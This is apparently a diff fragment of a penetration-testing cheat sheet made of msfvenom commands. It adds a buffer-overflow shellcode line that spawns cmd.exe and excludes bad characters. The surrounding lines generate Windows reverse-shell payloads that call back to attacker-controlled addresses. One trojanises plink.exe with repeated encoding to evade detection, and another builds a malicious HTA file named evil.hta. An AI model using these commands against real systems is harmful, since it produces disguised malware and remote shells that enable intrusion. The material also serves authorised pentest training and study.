@@ -18,6 +18,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x8
 #Embedding a payload in plink.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
 
+#BOF Example
+msfvenom -a x86 --platform Windows -p windows/exec CMD="cmd.exe" -f hex -b "\x00\x0a\x0d\x25\x26\x2b\x3d" > exploit3.txt
+
 
 #Creating HTA payload with msfvenom
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
